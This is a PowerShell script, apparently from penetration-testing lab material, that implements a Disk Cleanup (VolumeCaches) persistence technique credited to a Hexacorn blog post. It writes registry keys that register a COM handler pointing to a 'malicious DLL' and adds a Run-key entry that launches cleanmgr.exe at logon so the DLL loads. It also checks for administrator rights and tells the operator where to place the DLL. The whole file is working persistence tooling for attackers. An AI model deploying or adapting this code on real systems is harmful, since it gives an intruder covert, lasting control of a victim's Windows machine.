function Add-DiskCleanupHKLM {
<#

.Synopsis
    Configure the HKLM settings necessary for the Persistence technique outline by @hexacorn. 
    http://www.hexacorn.com/blog/2018/09/02/beyond-good-ol-run-key-part-86/


#>
    #check admin rights
   
    $guid='{4f53c83a-900f-4ed9-902b-7a59a67747ed}'

    New-Item -Name BadGuy -Value $guid -path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\
    New-ItemProperty -name 'CleanupString' -path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\badguy' -value 'C:\Windows\System32\mspaint.exe'
    New-ItemProperty -name 'PreCleanupString' -path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\badguy' -value 'C:\Windows\System32\notepad.exe'
    New-ItemProperty -name 'Files' -path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\badguy' -value '*.foo'
    New-ItemProperty -name 'Folder' -path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\badguy' -value 'C:\test'
    #New-ItemProperty -name 'Flags' -path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\badguy' -value 1 -PropertyType DWORD
    #New-ItemProperty -name 'StateFlags' -path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\badguy' -value 1 -PropertyType DWORD
    

}

function Add-DiskCleanupHKCU {
<#

.Synopsis
    Configure the HKCU settings necessary for the Persistence technique outline by @hexacorn. 
    http://www.hexacorn.com/blog/2018/09/02/beyond-good-ol-run-key-part-86/


.PARAMETER pathToDLL
    The absolute path of where the malicious DLL is located at

.EXAMPLE
    C:\PS> Add-DiskCLeanupHKCU -pathToDLL 'C:\tools\pentstlab.dll'

.LINK
    http://www.hexacorn.com/blog/2018/09/02/beyond-good-ol-run-key-part-86/
#>


[CmdletBinding()] Param (
    [Parameter (ParameterSetName = 'pathToDLL', Mandatory = $True)]
    $pathToDLL

    )


    $guid='{4f53c83a-900f-4ed9-902b-7a59a67747ed}'
    new-item -name $guid -Path 'HKCU:\SOFTWARE\Classes\CLSID\' 
    new-item -name InProcServer32 -Path "HKCU:\SOFTWARE\Classes\CLSID\$guid" -value $pathToDLL
    New-ItemProperty -name 'ThreadingModel' -path "HKCU:\SOFTWARE\Classes\CLSID/$guid/InProcServer32" -value 'Apartment'
}

function Configure-Persistence {
    New-ItemProperty -name CleanManager -path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -value "cleanmgr.exe /autorun" 

}

function Enable-Persistence {
   
     $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    $isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

    if ($isAdmin -eq $false) {
        Add-Type -AssemblyName System.Windows.Forms
        Write-Output "Administrator permissions needed to continue" 
        [System.Windows.Forms.Messagebox]::Show("Not running as administrator!")
    }
    else {
    Add-DiskCleanupHKCU -pathToDLL "C:\tools\pentestlab.dll"
    Add-DiskCleanupHKLM
    Configure-Persistence
    Write-Host 'Place malicious DLL at C:\tools\pentestlab.dll'
    }
}

